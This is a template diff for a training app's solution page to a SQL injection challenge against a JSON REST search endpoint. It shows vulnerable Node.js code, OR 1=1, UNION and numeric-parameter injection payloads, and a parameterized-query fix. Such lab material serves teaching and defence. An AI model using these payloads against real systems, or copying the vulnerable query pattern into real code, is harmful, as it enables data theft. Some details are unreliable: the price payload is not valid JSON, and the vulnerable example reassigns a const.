@@ -1,0 +1,190 @@
+{% extends 'base.html' %}
+
+{% block title %}Solution: SQL Injection Level 9{% endblock %}
+
+{% block content %}
+<div class="row">
+    <div class="col-md-8 offset-md-2">
+        <div class="card">
+            <div class="card-header bg-success text-white">
+                <h2 class="text-center">Solution: Level 9 - SQL Injection in REST API</h2>
+            </div>
+            <div class="card-body">
+                <h3>Vulnerability Explanation</h3>
+                <p>
+                    This challenge demonstrates a SQL injection vulnerability in a modern REST API. Unlike traditional web forms, REST APIs typically accept and return data in structured formats like JSON. In this case, the vulnerability exists in the product search endpoint that accepts JSON parameters.
+                </p>
+                <p>
+                    The vulnerability occurs because the application directly uses the JSON parameters in SQL queries without proper sanitization or parameterization:
+                </p>
+                <pre class="bg-light p-3 rounded"><code>// Vulnerable code example (Node.js with Express)
+app.post('/api/products/search', (req, res) => {
+  const { category, price, in_stock } = req.body;
+  
+  // Vulnerable SQL query construction
+  const query = `SELECT id, name, category, price, description FROM products 
+                WHERE category = '${category}' AND price <= ${price}`;
+  
+  if (in_stock) {
+    query += " AND stock > 0";
+  }
+  
+  // Execute query and return results
+  db.query(query, (err, results) => {
+    if (err) {
+      return res.status(500).json({ error: 'Database error' });
+    }
+    res.json(results);
+  });
+});</code></pre>
+                <p>
+                    The vulnerability is particularly dangerous because:
+                </p>
+                <ul>
+                    <li>REST APIs often have higher privileges to access sensitive data</li>
+                    <li>API endpoints may have less stringent input validation than web forms</li>
+                    <li>JSON parameters can be more complex and harder to sanitize properly</li>
+                    <li>API vulnerabilities may be less visible and harder to detect</li>
+                </ul>
+
+                <h3>Solution</h3>
+                <p>To exploit this vulnerability, follow these steps:</p>
+
+                <h4>1. Identify the Vulnerable Parameter</h4>
+                <p>
+                    The API endpoint accepts three parameters: <code>category</code>, <code>price</code>, and <code>in_stock</code>. The <code>category</code> parameter is likely vulnerable because it's a string that's directly inserted into the SQL query.
+                </p>
+
+                <h4>2. Craft a Malicious JSON Payload</h4>
+                <p>
+                    Create a JSON payload that injects SQL code into the <code>category</code> parameter:
+                </p>
+                <div class="alert alert-secondary">
+                    <pre><code>{
+  "category": "Electronics' OR 1=1 --",
+  "price": 1000,
+  "in_stock": true
+}</code></pre>
+                </div>
+                <p>
+                    This transforms the query to:
+                </p>
+                <pre class="bg-light p-3 rounded"><code>SELECT id, name, category, price, description FROM products 
+WHERE category = 'Electronics' OR 1=1 --' AND price <= 1000</code></pre>
+                <p>
+                    The <code>--</code> comments out the rest of the query, and <code>OR 1=1</code> ensures that all products are returned, including the hidden administrative products.
+                </p>
+
+                <h4>3. Alternative Approach: Using UNION to Extract Specific Data</h4>
+                <p>
+                    For a more targeted approach, you can use a UNION-based injection:
+                </p>
+                <div class="alert alert-secondary">
+                    <pre><code>{
+  "category": "Electronics' UNION SELECT id, name, category, price, description FROM products WHERE id=999 --",
+  "price": 1000,
+  "in_stock": true
+}</code></pre>
+                </div>
+                <p>
+                    This transforms the query to:
+                </p>
+                <pre class="bg-light p-3 rounded"><code>SELECT id, name, category, price, description FROM products 
+WHERE category = 'Electronics' UNION SELECT id, name, category, price, description FROM products WHERE id=999 --' AND price <= 1000</code></pre>
+                <p>
+                    This specifically targets the product with ID 999, which contains the flag.
+                </p>
+
+                <h4>4. Exploiting the Numeric Parameter</h4>
+                <p>
+                    Alternatively, you can inject through the <code>price</code> parameter, which is numeric and doesn't require quotes:
+                </p>
+                <div class="alert alert-secondary">
+                    <pre><code>{
+  "category": "Electronics",
+  "price": 1000 OR id=999,
+  "in_stock": true
+}</code></pre>
+                </div>
+                <p>
+                    This transforms the query to:
+                </p>
+                <pre class="bg-light p-3 rounded"><code>SELECT id, name, category, price, description FROM products 
+WHERE category = 'Electronics' AND price <= 1000 OR id=999</code></pre>
+                <p>
+                    This will return all Electronics products with price <= 1000, as well as the product with ID 999.
+                </p>
+
+                <h3>Real-world Impact</h3>
+                <p>
+                    SQL injection vulnerabilities in REST APIs are particularly dangerous in modern applications:
+                </p>
+                <ul>
+                    <li><strong>Microservices Architecture</strong>: APIs often have access to multiple backend services and databases</li>
+                    <li><strong>Mobile Applications</strong>: Many mobile apps rely on REST APIs, expanding the attack surface</li>
+                    <li><strong>Third-party Integrations</strong>: Vulnerable APIs can compromise partner systems</li>
+                    <li><strong>Cloud Deployments</strong>: API vulnerabilities can lead to data breaches in cloud environments</li>
+                </ul>
+                <p>
+                    Notable real-world examples include:
+                </p>
+                <ul>
+                    <li><strong>Coinbase (2019)</strong>: A vulnerability in their API allowed attackers to bypass trading restrictions</li>
+                    <li><strong>Slack (2020)</strong>: A vulnerability in their API allowed extraction of user data</li>
+                </ul>
+
+                <h3>Prevention</h3>
+                <p>To prevent SQL injection vulnerabilities in REST APIs, developers should:</p>
+                <ul>
+                    <li>
+                        <strong>Use Parameterized Queries</strong> for all database operations:
+                        <pre class="bg-light p-3 rounded"><code>// Safe code example (Node.js with Express)
+app.post('/api/products/search', (req, res) => {
+  const { category, price, in_stock } = req.body;
+  
+  // Base query with placeholders
+  let query = "SELECT id, name, category, price, description FROM products WHERE category = ? AND price <= ?";
+  let params = [category, price];
+  
+  if (in_stock) {
+    query += " AND stock > 0";
+  }
+  
+  // Execute parameterized query
+  db.query(query, params, (err, results) => {
+    if (err) {
+      return res.status(500).json({ error: 'Database error' });
+    }
+    res.json(results);
+  });
+});</code></pre>
+                    </li>
+                    <li>
+                        <strong>Validate and Sanitize All Input</strong>: Use JSON schema validation to ensure inputs match expected types and formats
+                    </li>
+                    <li>
+                        <strong>Use ORMs with Proper Escaping</strong>: Modern ORMs provide protection against SQL injection
+                    </li>
+                    <li>
+                        <strong>Implement API Security Best Practices</strong>:
+                        <ul>
+                            <li>Use proper authentication and authorization</li>
+                            <li>Implement rate limiting</li>
+                            <li>Use HTTPS for all API traffic</li>
+                            <li>Apply the principle of least privilege for database accounts</li>
+                        </ul>
+                    </li>
+                    <li>
+                        <strong>Use API Security Testing Tools</strong>: Regularly test APIs for security vulnerabilities
+                    </li>
+                </ul>
+
+                <div class="mt-4">
+                    <a href="{{ url_for('sqli_level9') }}" class="btn btn-outline-primary">Back to Challenge</a>
+                    <a href="{{ url_for('vulnerabilities') }}" class="btn btn-outline-secondary float-end">All Challenges</a>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+{% endblock %}
